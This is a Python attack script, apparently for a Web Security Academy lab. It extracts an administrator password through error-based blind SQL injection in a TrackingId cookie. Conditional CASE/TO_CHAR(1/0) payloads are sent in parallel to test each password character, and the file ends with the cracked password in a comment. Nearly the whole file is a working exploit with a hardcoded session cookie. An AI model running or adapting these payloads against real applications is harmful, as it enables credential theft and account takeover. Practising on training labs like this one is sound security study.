#!/usr/bin/python3

import requests
import string
import datetime
import time
from multiprocessing import Pool

password = []
uppercase_letters = list(string.ascii_lowercase)
lowercase_letters = list(string.ascii_uppercase)
numbers = list(string.digits)

library = uppercase_letters + lowercase_letters + numbers
session = 'zqy720HBisRgWvbWKN3e4qNSwms2cPo0'
endpoint = "https://0af300b504239ba1c006065b00e800e3.web-security-academy.net"
length_of_password = 20

check_string = 'Internal Server Error'

all_combinations = []

for i in range (1, length_of_password+1):
    for j in library:
        all_combinations.append([i, j])

def verify_user_table():
    time.sleep(0.5)
    payload = f"{trackingId}' AND (SELECT table_name from information_schema.tables where table_name='users') = 'users" # AND condition blindsqli, need valid trackingId
    cookies = {"TrackingId" : payload, "session": session}
    r = requests.get(endpoint,cookies=cookies)
    if check_string in r.text:
        print (f"[+] \'users\' table exists")

def get_password(pair):
    time.sleep(0.5)
    payload = f"xyz' UNION (SELECT CASE WHEN SUBSTR(password,{pair[0]},1)='{pair[1]}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') --"
    cookies = {"TrackingId" : payload, "session": session}
    r = requests.get(endpoint,cookies=cookies)
    if check_string in r.text:
        print (f"[+] Found character {pair[1]} for position {pair[0]} for password")

def find_length_of_password(num):
    time.sleep(0.5)
    payload = f"xyz' UNION (SELECT CASE WHEN LENGTH(password)={num} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') --"
    cookies = {"TrackingId" : payload, "session": session}
    r = requests.get(endpoint,cookies=cookies)
    if check_string in r.text:
        print(f"SUCCESS - {num}")

# https://stackoverflow.com/questions/18204782/runtimeerror-on-windows-trying-python-multiprocessing

if __name__ == '__main__':
    with Pool(20) as mp_pool:
        #verify_user_table()
        #mp_pool.map(find_length_of_password, [i for i in range(35)])
        mp_pool.map(get_password, all_combinations)

# cracked password: jf8j4aogip4bylvgg5ra